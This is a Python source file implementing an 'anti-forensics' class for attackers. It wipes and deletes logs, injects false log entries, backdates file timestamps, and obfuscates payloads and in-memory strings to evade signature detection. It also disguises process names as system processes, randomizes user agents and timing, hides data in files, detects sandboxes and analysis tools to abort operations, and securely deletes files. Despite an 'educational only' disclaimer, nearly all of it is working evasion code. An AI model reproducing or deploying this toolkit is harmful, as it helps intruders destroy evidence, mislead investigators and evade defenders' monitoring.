"""
Anti-Forensics Module
Implements techniques to evade detection and analysis

⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
"""

import os
import time
import random
import hashlib
import base64
from typing import List, Dict, Any, Optional


class AntiForensics:
    """
    Anti-forensics techniques for operational security
    
    Intelligence: Adaptive evasion based on environment
    """
    
    def __init__(self):
        self.evasion_history = []
        self.detection_indicators = []
    
    # === Log Manipulation ===
    
    @staticmethod
    def clear_logs(log_paths: List[str]) -> Dict[str, bool]:
        """
        Clear specified log files (for authorized testing only)
        
        Returns: Dict of path -> success status
        """
        results = {}
        
        for log_path in log_paths:
            try:
                if os.path.exists(log_path):
                    # Overwrite with zeros before deletion
                    file_size = os.path.getsize(log_path)
                    with open(log_path, 'wb') as f:
                        f.write(b'\x00' * file_size)
                    
                    os.remove(log_path)
                    results[log_path] = True
                else:
                    results[log_path] = False
                    
            except Exception as e:
                print(f"[AntiForensics] Failed to clear {log_path}: {e}")
                results[log_path] = False
        
        return results
    
    @staticmethod
    def inject_false_logs(log_path: str, false_entries: List[str]) -> bool:
        """
        Inject false log entries to mislead forensic analysis
        """
        try:
            with open(log_path, 'a') as f:
                for entry in false_entries:
                    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                    f.write(f"[{timestamp}] {entry}\n")
            return True
        except Exception as e:
            print(f"[AntiForensics] Failed to inject false logs: {e}")
            return False
    
    # === Timestamp Manipulation ===
    
    @staticmethod
    def modify_timestamps(file_path: str, access_time: float = None, modify_time: float = None) -> bool:
        """
        Modify file timestamps to evade timeline analysis
        """
        try:
            if not os.path.exists(file_path):
                return False
            
            # Get current timestamps
            stat = os.stat(file_path)
            
            # Use provided times or randomize
            atime = access_time if access_time else stat.st_atime - random.randint(86400, 604800)
            mtime = modify_time if modify_time else stat.st_mtime - random.randint(86400, 604800)
            
            os.utime(file_path, (atime, mtime))
            return True
            
        except Exception as e:
            print(f"[AntiForensics] Failed to modify timestamps: {e}")
            return False
    
    # === Memory Evasion ===
    
    @staticmethod
    def obfuscate_memory_strings(data: str) -> str:
        """
        Obfuscate strings in memory to evade memory forensics
        """
        # XOR with random key
        key = random.randint(1, 255)
        obfuscated = ''.join(chr(ord(c) ^ key) for c in data)
        
        # Base64 encode
        encoded = base64.b64encode(obfuscated.encode()).decode()
        
        return f"{key}:{encoded}"
    
    @staticmethod
    def deobfuscate_memory_strings(obfuscated: str) -> str:
        """
        Deobfuscate strings
        """
        try:
            key_str, encoded = obfuscated.split(':', 1)
            key = int(key_str)
            
            # Base64 decode
            decoded = base64.b64decode(encoded).decode()
            
            # XOR with key
            original = ''.join(chr(ord(c) ^ key) for c in decoded)
            
            return original
        except Exception as e:
            print(f"[AntiForensics] Failed to deobfuscate: {e}")
            return ""
    
    # === Process Hiding ===
    
    @staticmethod
    def masquerade_process_name(legitimate_name: str = "svchost.exe") -> str:
        """
        Generate a process name that looks legitimate
        """
        legitimate_names = [
            "svchost.exe", "explorer.exe", "lsass.exe", "services.exe",
            "csrss.exe", "winlogon.exe", "taskhost.exe", "dwm.exe",
            "chrome.exe", "firefox.exe", "System", "smss.exe"
        ]
        
        if legitimate_name in legitimate_names:
            return legitimate_name
        
        return random.choice(legitimate_names)
    
    # === Network Evasion ===
    
    @staticmethod
    def randomize_user_agent() -> str:
        """
        Generate random user agent to evade network monitoring
        """
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        
        return random.choice(user_agents)
    
    @staticmethod
    def add_jitter(base_delay: float, jitter_percent: float = 0.3) -> float:
        """
        Add random jitter to timing to evade pattern detection
        """
        jitter = base_delay * jitter_percent * (random.random() * 2 - 1)
        return max(0, base_delay + jitter)
    
    # === Payload Obfuscation ===
    
    @staticmethod
    def obfuscate_payload(payload: str, method: str = 'base64') -> str:
        """
        Obfuscate payload to evade signature detection
        """
        if method == 'base64':
            return base64.b64encode(payload.encode()).decode()
        
        elif method == 'rot13':
            return payload.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
            ))
        
        elif method == 'hex':
            return payload.encode().hex()
        
        elif method == 'reverse':
            return payload[::-1]
        
        elif method == 'xor':
            key = 0x42
            return ''.join(chr(ord(c) ^ key) for c in payload)
        
        else:
            return payload
    
    @staticmethod
    def multi_layer_obfuscation(payload: str, layers: int = 3) -> tuple:
        """
        Apply multiple layers of obfuscation
        
        Returns: (obfuscated_payload, method_chain)
        """
        methods = ['base64', 'hex', 'xor', 'reverse']
        method_chain = []
        
        result = payload
        for _ in range(layers):
            method = random.choice(methods)
            result = AntiForensics.obfuscate_payload(result, method)
            method_chain.append(method)
        
        return result, method_chain
    
    # === File Hiding ===
    
    @staticmethod
    def hide_file_in_slack_space(file_path: str, data: bytes) -> bool:
        """
        Hide data in file slack space (space between EOF and end of cluster)
        
        Note: This is a simplified simulation
        """
        try:
            # This is a conceptual implementation
            # Real slack space hiding requires low-level disk access
            
            with open(file_path, 'ab') as f:
                # Add marker
                marker = b'SLACK_START'
                f.write(marker)
                f.write(data)
                f.write(b'SLACK_END')
            
            return True
        except Exception as e:
            print(f"[AntiForensics] Failed to hide in slack space: {e}")
            return False
    
    # === Detection Evasion ===
    
    def check_sandbox_indicators(self) -> Dict[str, bool]:
        """
        Check for sandbox/analysis environment indicators
        
        Intelligence: Detect if running in monitored environment
        """
        indicators = {
            'vm_detected': False,
            'debugger_detected': False,
            'sandbox_detected': False,
            'analysis_tools_detected': False
        }
        
        # Check for VM artifacts
        vm_files = [
            '/proc/vboxguest',
            '/proc/vmware',
            'C:\\Windows\\System32\\drivers\\vboxguest.sys',
            'C:\\Windows\\System32\\drivers\\vmhgfs.sys'
        ]
        
        for vm_file in vm_files:
            if os.path.exists(vm_file):
                indicators['vm_detected'] = True
                break
        
        # Check for common analysis tools
        analysis_processes = [
            'wireshark', 'tcpdump', 'procmon', 'processhacker',
            'ollydbg', 'x64dbg', 'ida', 'ghidra'
        ]
        
        try:
            import psutil
            running_processes = [p.name().lower() for p in psutil.process_iter(['name'])]
            
            for tool in analysis_processes:
                if any(tool in proc for proc in running_processes):
                    indicators['analysis_tools_detected'] = True
                    break
        except:
            pass
        
        # Record detection
        self.detection_indicators.append({
            'time': time.time(),
            'indicators': indicators
        })
        
        return indicators
    
    def should_abort_operation(self) -> bool:
        """
        Intelligence: Decide if operation should be aborted based on detection
        """
        indicators = self.check_sandbox_indicators()
        
        # Abort if multiple indicators detected
        detected_count = sum(indicators.values())
        
        if detected_count >= 2:
            print("[AntiForensics] Multiple detection indicators found. Recommending abort.")
            return True
        
        return False
    
    # === Secure Deletion ===
    
    @staticmethod
    def secure_delete(file_path: str, passes: int = 3) -> bool:
        """
        Securely delete file with multiple overwrite passes
        """
        try:
            if not os.path.exists(file_path):
                return False
            
            file_size = os.path.getsize(file_path)
            
            # Multiple overwrite passes
            with open(file_path, 'wb') as f:
                for _ in range(passes):
                    # Random data
                    f.seek(0)
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())
            
            # Final deletion
            os.remove(file_path)
            
            return True
            
        except Exception as e:
            print(f"[AntiForensics] Secure delete failed: {e}")
            return False


# Example usage
if __name__ == '__main__':
    print("=== Testing Anti-Forensics Module ===\n")
    print("⚠️  FOR EDUCATIONAL PURPOSES ONLY\n")
    
    af = AntiForensics()
    
    # Test obfuscation
    print("1. Payload Obfuscation:")
    payload = "SELECT * FROM users WHERE id=1"
    obfuscated = af.obfuscate_payload(payload, 'base64')
    print(f"   Original: {payload}")
    print(f"   Obfuscated: {obfuscated}\n")
    
    # Test multi-layer
    print("2. Multi-layer Obfuscation:")
    multi_obf, methods = af.multi_layer_obfuscation(payload, layers=3)
    print(f"   Methods: {' -> '.join(methods)}")
    print(f"   Result: {multi_obf[:50]}...\n")
    
    # Test memory obfuscation
    print("3. Memory String Obfuscation:")
    secret = "admin:password123"
    obf_secret = af.obfuscate_memory_strings(secret)
    deobf_secret = af.deobfuscate_memory_strings(obf_secret)
    print(f"   Original: {secret}")
    print(f"   Obfuscated: {obf_secret}")
    print(f"   Deobfuscated: {deobf_secret}\n")
    
    # Test jitter
    print("4. Timing Jitter:")
    base_delay = 5.0
    for i in range(5):
        jittered = af.add_jitter(base_delay, 0.3)
        print(f"   Attempt {i+1}: {jittered:.2f}s")
    
    print("\n5. Sandbox Detection:")
    indicators = af.check_sandbox_indicators()
    for key, value in indicators.items():
        print(f"   {key}: {value}")
    
    should_abort = af.should_abort_operation()
    print(f"   Should abort: {should_abort}")
    
    print("\n=== Anti-Forensics Test Complete ===")
